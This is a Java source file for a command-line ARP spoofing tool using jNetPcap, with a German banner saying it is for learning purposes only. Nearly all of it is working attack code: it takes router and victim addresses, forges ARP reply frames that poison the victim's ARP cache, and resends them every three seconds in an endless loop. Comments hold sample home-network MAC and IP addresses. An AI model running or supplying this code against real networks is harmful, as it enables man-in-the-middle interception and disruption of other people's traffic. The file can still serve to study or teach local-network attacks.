   import java.nio.ByteBuffer;  
   import java.util.ArrayList;  
   import java.util.Arrays;  
   import java.util.List;  
     
   import org.jnetpcap.Pcap;  
   import org.jnetpcap.PcapIf;  
   import org.jnetpcap.packet.PcapPacket;  
   import org.jnetpcap.packet.PcapPacketHandler; 
   
   import java.math.BigInteger;
   
   import java.io.*;
   import java.net.*;
   
   import java.util.*;
   import java.text.*;
   
   // For getting host IP address & MAC
import java.net.InetAddress;
import java.util.Enumeration;
import java.net.NetworkInterface;
   
   class ArpSpoof { 
   
   private static int runcount;
   private static int c = 0;
   
   private static byte[] RouterMacBytes = {(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00}; // new byte[6];
   private static byte[] VictimMacBytes = {(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00}; // new byte[6];
   
   private static byte[] RouterIpBytes = {(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00}; // new byte[4];
   private static byte[] VictimIpBytes = {(byte) 0x00,(byte) 0x00,(byte) 0x00,(byte) 0x00}; // new byte[4];
   
   private static String RouterIp;
   private static String VictimIp;
   
 public static byte[] mymac = new byte[5];
	public static InetAddress inet;
	public static Enumeration e;
	public static NetworkInterface n;
public static Enumeration ee;
   
       public static void main(String[] args) {
       
           System.out.println(
           "\n[***] Support: manuel.zarat@gmail.com\n" +
           "\n[***] Dieses Programm dient ausschlieﬂlich Lernzwecken.\n" +
           "[***] Absolut keine Garantie, daher Nutzung auf eigene Gefahr.\n" + 
           "[***] Bitte beachten Sie die jeweils geltenden Gesetze!!!\n");  
           
           if(args.length<3) {
           
               BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
               
               /* READ ROUTER_MAC */
               System.out.print("\n[***] ROUTER_MAC: ");
               String RouterMac = "";
               try  { RouterMac = reader.readLine(); } catch (IOException ioe) {}
               String[] RouterMacParts = RouterMac.split(":");
                   
               for(int i=0; i<6; i++){
                   Integer hex = Integer.parseInt(RouterMacParts[i], 16);
                   RouterMacBytes[i] = hex.byteValue();
               } 
               
               // parse ROUTER_IP from user input 
               System.out.print("\n[***] ROUTER_IP: ");
               //String RouterIp = "";
               try  { RouterIp = reader.readLine(); } catch (IOException ioe) {}
               String[] RouterIpParts = RouterIp.split("\\.");
               
               for(int i=0; i<4; i++){
                   Integer hex = Integer.parseInt(RouterIpParts[i]);
                   RouterIpBytes[i] = hex.byteValue();
               } 
           
               // parse VICTIM_MAC from user input 
               System.out.print("\n[***] VICTIM_MAC: ");
               String VictimMac = "";
               try  { VictimMac = reader.readLine(); } catch (IOException ioe) {}
               String[] VictimMacParts = VictimMac.split(":");
               
               for(int i=0; i<6; i++){
                   Integer hex = Integer.parseInt(VictimMacParts[i], 16);
                   VictimMacBytes[i] = hex.byteValue();
               } 
               
               // parse VICTIM_IP from user input 
               System.out.print("\n[***] VICTIM_IP: ");
               VictimIp = "";
               try  { VictimIp = reader.readLine(); } catch (IOException ioe) {}
               String[] VictimIpParts = VictimIp.split("\\.");
               
               for(int i=0; i<4; i++){
                   Integer hex = Integer.parseInt(VictimIpParts[i]);
                   VictimIpBytes[i] = hex.byteValue();
               }             
           
           } else {
           
               // parse ROUTER_MAC from user input 
               String RouterMac = args[0];
               String[] RouterMacParts = RouterMac.split(":");
               
               for(int i=0; i<6; i++){
                   Integer hex = Integer.parseInt(RouterMacParts[i], 16);
                   RouterMacBytes[i] = hex.byteValue();
               } 
               System.out.println("[***] SPOOFED_MAC: "+asString(RouterMacBytes));
               
               // parse ROUTER_IP from user input 
               RouterIp = args[1];
               String[] RouterIpParts = RouterIp.split("\\.");
               
               for(int i=0; i<4; i++){
                   Integer hex = Integer.parseInt(RouterIpParts[i]);
                   RouterIpBytes[i] = hex.byteValue();
               } 
               System.out.println("[***] SPOOFED_IP: "+asString(RouterIpBytes));
               
               // parse VICTIM_MAC from user input 
               String VictimMac = args[2];
               String[] VictimMacParts = VictimMac.split(":");
               
               for(int i=0; i<6; i++){
                   Integer hex = Integer.parseInt(VictimMacParts[i], 16);
                   VictimMacBytes[i] = hex.byteValue();
               } 
               System.out.println("[***] VICTIM_MAC: "+asString(VictimMacBytes));
               
               // parse VICTIM_IP from user input 
               VictimIp = args[3];
               String[] VictimIpParts = VictimIp.split("\\.");
               
               for(int i=0; i<4; i++){
                   Integer hex = Integer.parseInt(VictimIpParts[i]);
                   VictimIpBytes[i] = hex.byteValue();
               } 
               System.out.println("[***] VICTIM_IP: "+asString(VictimIpBytes));
               
               //System.out.print("\n");        
           
           }
                  
           List<PcapIf> alldevs = new ArrayList<PcapIf>();
           StringBuilder errbuf = new StringBuilder();  
            
           int interfaces = Pcap.findAllDevs(alldevs, errbuf);


try {           
		// Get local addresses
		e = NetworkInterface.getNetworkInterfaces();
		while (e.hasMoreElements()) {
			n = (NetworkInterface)e.nextElement();
      
      //System.out.println(n.getDisplayName());
      
				ee = n.getInetAddresses();
				if (ee.hasMoreElements()) {
            System.out.println("\n\n"+n.getDisplayName());
            try { System.out.println(asString(n.getHardwareAddress())); }catch(Exception e) {}
        }
				while (ee.hasMoreElements()) {

					InetAddress ninet = (InetAddress)ee.nextElement();
          if(null != ninet) {
          
              //System.out.println("\n\n"+n.getDisplayName());
    					System.out.println(ninet);
          
          }
				}
		
}
System.out.println("\n\n");
}catch(Exception see) {}

           
       		  int i = 0;
       		  for (PcapIf device : alldevs) {
               
                       String description = (device.getDescription() != null) ? device.getDescription() : "keine Beschreibung";
                       try {

                          System.out.println("[***] #"+(i++)+": "+description+" :: " + asString(device.getHardwareAddress())); 
                       
                       }catch(Exception e) {} 
               
       		  }
             
           if (interfaces == Pcap.NOT_OK || alldevs.isEmpty()) {
            
                   System.out.println("[!!!] Konnte Interfaces nicht auslesen: " + errbuf.toString() + "\n");  
                   return; 
            
           }
   
           BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
           System.out.print("\n[***] Welches Interface soll genutzt werden?: ");
           String eingabe = "";
           try  { eingabe = br.readLine(); } catch (IOException ioe) {}
           
           PcapIf device = alldevs.get(new Integer(eingabe));
           
           System.out.print("\n");
              
           int snaplen = 64 * 1024; /* 64 packets */
           int flags = Pcap.MODE_PROMISCUOUS;  
           int timeout = 10 * 1000; // int timeout = Pcap.DEFAULT_TIMEOUT;  
           
           Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);       
             
           while(true) {
           
                   /*
                   ROUTER    MAC: 00:10:95:de:ad:07      IP: 192.168.0.1
                   WIN10     MAC: 24:0A:64:1C:A6:18      IP: 192.168.0.8
                   WIN8      MAC: 00:00:00:00:00:00      IP: 192.168.0.16
                   */
                 
                   byte[] routermac = RouterMacBytes; // {(byte) 0x00,(byte) 0x10,(byte) 0x95,(byte) 0xDE,(byte) 0xAD,(byte) 0x07};
                   byte[] targetmac = VictimMacBytes; // {(byte) 0x24,(byte) 0x0A,(byte) 0x64,(byte) 0x1C,(byte) 0xA6,(byte) 0x18};
                   
                   byte[] proto_type = {(byte) 0x08,(byte) 0x06}; 
                   /*0x08 0x06 = ARP
                   */
                   byte[] hw_type = {(byte) 0x00,(byte) 0x01}; 
                   /*
                   0x00 0x01 = Ethernet
                   */
                   byte[] ip_proto = {(byte) 0x08,(byte) 0x00};                 
                   /*
                   IPv4 = 0x08 0x00
                   IPv6 = 0x86 0xDD
                   */
                   byte[] hw_size = {(byte) 0x06};
                   /*
                   */
                   byte[] protocol_size = {(byte) 0x04};  
                   /*
                   IPv4 = 0x04
                   */
                   byte[] op_code = {(byte) 0x00,(byte) 0x02};  
                   /* 
                   0001 = ARP REQUEST
                   0002 = ARP REPLY
                   */
                   byte[] spoofed_target_mac = targetmac;
                   byte[] spoofed_target_ip = RouterIpBytes; // {(byte) 0xC0,(byte) 0xA8,(byte) 0x00,(byte) 0x01};
                   
                   byte[] spoofed_source_mac = routermac;
                   byte[] spoofed_source_ip = VictimIpBytes; // {(byte) 0xC0,(byte) 0xA8,(byte) 0x00,(byte) 0x08};
                                   
                   byte[] out = new byte[routermac.length + targetmac.length + proto_type.length + hw_type.length + ip_proto.length + hw_size.length + protocol_size.length + op_code.length + spoofed_target_mac.length + spoofed_target_ip.length + spoofed_source_mac.length + spoofed_source_ip.length];
                                   
                   System.arraycopy(routermac, 0, out, 0, routermac.length);
                   System.arraycopy(targetmac, 0, out, routermac.length, targetmac.length);
                   System.arraycopy(proto_type, 0, out, routermac.length+targetmac.length, proto_type.length);
                   System.arraycopy(hw_type, 0, out, routermac.length+targetmac.length+proto_type.length, hw_type.length);
                   System.arraycopy(ip_proto, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length, ip_proto.length);        
                   System.arraycopy(hw_size, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length+ip_proto.length, hw_size.length);
                   System.arraycopy(protocol_size, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length+ip_proto.length+hw_size.length, protocol_size.length);
                   System.arraycopy(op_code, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length+ip_proto.length+hw_size.length+protocol_size.length, op_code.length);
                   System.arraycopy(spoofed_target_mac, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length+ip_proto.length+hw_size.length+protocol_size.length+op_code.length, spoofed_target_mac.length);
                   System.arraycopy(spoofed_target_ip, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length+ip_proto.length+hw_size.length+protocol_size.length+op_code.length+spoofed_target_mac.length, spoofed_target_ip.length);
                   System.arraycopy(spoofed_source_mac, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length+ip_proto.length+hw_size.length+protocol_size.length+op_code.length+spoofed_target_mac.length+spoofed_target_ip.length, spoofed_source_mac.length);
                   System.arraycopy(spoofed_source_ip, 0, out, routermac.length+targetmac.length+proto_type.length+hw_type.length+ip_proto.length+hw_size.length+protocol_size.length+op_code.length+spoofed_target_mac.length+spoofed_target_ip.length+spoofed_source_mac.length, spoofed_source_ip.length);
                   
                   ByteBuffer bb = ByteBuffer.wrap(out); 
                               
                   if (pcap.sendPacket(bb) != Pcap.OK) { 
                                
                           System.err.println(pcap.getErr());
                           System.exit(0);
                                 
                   } else {
                   
                           Date dNow = new Date( );
                           //SimpleDateFormat ft = new SimpleDateFormat ("E yyyy.MM.dd 'at' hh:mm:ss a zzz");
                           SimpleDateFormat ft = new SimpleDateFormat ("hh:mm:ss");
                           c++;    
                           //System.out.println("["+ft.format(dNow)+"] ArpReply #" + c + ": '" + RouterIp + " is at " + asString(spoofed_target_mac) + "' an " + asString(routermac) + "" + spoofed_source_ip + " gesendet.");

                           System.out.println("["+c+"] " + RouterIp + " is at " + asString(spoofed_target_mac) + " an " + asString(routermac) + " (" + VictimIp + ")");

                           System.out.flush();
                               
                   }
                   
                   try { Thread.sleep(3000); } catch(InterruptedException ie) { pcap.close(); }
               
               
           } 
            
           //pcap.close(); 
        
       }
       
       private static String asString(final byte[] mac) { 
        
           final StringBuilder buf = new StringBuilder();
             
           for (byte b : mac) {  
           
               if (buf.length() != 0) { 
                
                   buf.append(':'); 
                    
               }  
               
               if (b >= 0 && b < 16) {  
               
                   buf.append('0');  
                   
               }  
               
               buf.append(Integer.toHexString((b < 0) ? b + 256 : b).toUpperCase());
                 
           }  
             
           return buf.toString();  
       }
    
   }